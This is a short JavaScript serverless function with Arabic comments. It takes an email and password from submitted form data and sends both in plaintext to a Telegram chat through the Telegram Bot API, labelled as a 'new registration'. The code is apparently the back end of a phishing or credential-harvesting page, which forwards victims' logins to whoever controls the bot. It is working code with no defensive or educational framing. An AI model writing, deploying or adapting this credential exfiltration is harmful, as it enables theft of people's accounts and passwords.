exports.handler = async function(event, context) {
  try {
    // قراءة التوكن والآيدي من متغيرات البيئة
    const TOKEN = process.env.TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    const data = JSON.parse(event.body);
    const email = data.email;
    const password = data.password;

    const fetch = (await import("node-fetch")).default;

    // إرسال البيانات مثلاً لبوت تليجرام
    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `📩 تسجيل جديد:\n\n📧 الإيميل: ${email}\n🔑 الباسورد: ${password}`
      })
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ message: "✅ تم استقبال البيانات وإرسالها!" }),
    };

  } catch (err) {
    console.error("❌ خطأ:", err);
    return {
      statusCode: 500,
      body: JSON.stringify({ message: "حدث خطأ أثناء معالجة البيانات." }),
    };
  }
};
